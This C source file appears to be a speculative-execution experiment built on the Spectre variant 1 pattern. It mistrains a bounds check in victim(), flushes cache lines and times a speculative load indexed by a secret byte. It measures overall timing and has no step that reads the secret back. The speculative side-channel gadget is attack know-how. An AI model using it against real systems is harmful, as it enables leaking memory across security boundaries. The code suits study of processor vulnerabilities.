#include <stdio.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
/*secret(array1[malicious_x]) is in cache, Ni is not in cache*/

#define loads_num 1
#define N_NUM 1
#define I_NUM 30

int N[20][16]; //N[N[N[N[N[N[5][0]][0]][0]][0]][0]][0]
int malicious_x = 100;
uint8_t array1[101];
uint8_t unuse[128];
uint8_t p[64 * loads_num + 1]; //64 * #loads in branch
uint8_t unsed3[128];
int e[I_NUM][16];

void victim(size_t x){
    if(x < N[0][0]){
        register uint8_t secret = array1[x]; //use malicous_x to access secret
        /* some loads */
        volatile register uint8_t * addr1 = p + secret * 64;
	register uint8_t temp1 = *addr1;
        //volatile register uint8_t * addr2 = p + secret * 128;
	//register uint8_t temp2 = *addr2;
	//volatile register uint8_t * addr3 = p + secret * 192;
	//register uint8_t temp3 = *addr3;
	//volatile register uint8_t * addr4 = p + secret * 256;
	//register uint8_t temp4 = *addr4;
	//volatile register uint8_t * addr5 = p + secret * 320;
        //register uint8_t temp5 = *addr5;
        /*volatile register uint8_t * addr6 = p + secret * 384;
        register uint8_t temp6 = *addr6;
        volatile register uint8_t * addr7 = p + secret * 448;
        register uint8_t temp7 = *addr7;
        volatile register uint8_t * addr8 = p + secret * 512;
        register uint8_t temp8 = *addr8;
        volatile register uint8_t * addr9 = p + secret * 576;
        register uint8_t temp9 = *addr9;
        volatile register uint8_t * addr10 = p + secret * 640;
        register uint8_t temp10 = *addr10;
        volatile register uint8_t * addr11 = p + secret * 704;
        register uint8_t temp11 = *addr11;
        volatile register uint8_t * addr12 = p + secret * 768;
        register uint8_t temp12 = *addr12;*/
	//asm volatile ("movl %1,%0" : "=r" (temp) : "m"(p + secret * 64 * 1)); 
    }
}

int main(){
    register int time1,time2,time3,time4;
    int junk=0;   
    N[0][0] = 16;
    for(int i = N_NUM-1; i > 0 ;i--)
	N[i][0] = i - 1;
    array1[1] = 0;
    array1[100] = 0; //secret value
    //p[0] = 15; p[64] = 18; p[128] = 18; p[192] = 18;
    size_t training_x = 1, x;
    register uint8_t temp;
    //temp = array1[100]; //make secret in cache
    time3 = _rdtscp(&junk);
    for(int i = 5; i>=0 ; i--){
	//for(int x = 0; x < 64 * loads_num + 1 ; x++){
	//   p[x] = 1;
	//}
	p[0] = p[64] = 1;
	for(int j = 0; j < I_NUM; j++){
            e[j][0] = 1;
        }
	_mm_mfence();
        for(int j = 0; j < N_NUM; j++){
           _mm_clflush( & N[j][0]);
        }
	_mm_mfence();
	for(int j = 0; j < I_NUM; j++){
	   _mm_clflush(&e[j][0]);
	}
	_mm_mfence();
	for(int k = 1; k <= loads_num ; k++){
           _mm_clflush( & p[64 * k]);
        }
	temp = array1[100];
	temp = p[0];
        _mm_mfence();
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
        //printf("x is %d, N1 is %p, array1 is %p, 1st p:%p, 2st p:%p, 3st p:%p, p[0]: %p\n",x,&N[0][0],array1,&p[64],&p[64*2],&p[64*3],&p[0]);
	//printf("arrive here\n");
	//_mm_lfence();
	//__asm__ __volatile__("CPUID"::: "eax","ebx","ecx","edx", "memory");
        /* Call the ivictim! */
	_mm_mfence();
        time1 = __rdtscp(&junk);
        victim(x);
	time2 = __rdtscp(&junk) - time1;
	_mm_mfence();
	//__asm__ __volatile__("CPUID"::: "eax","ebx","ecx","edx", "memory");
    }
    time4 = _rdtscp(&junk) - time3;
    printf("%d\n",time4);
    return 0;
}

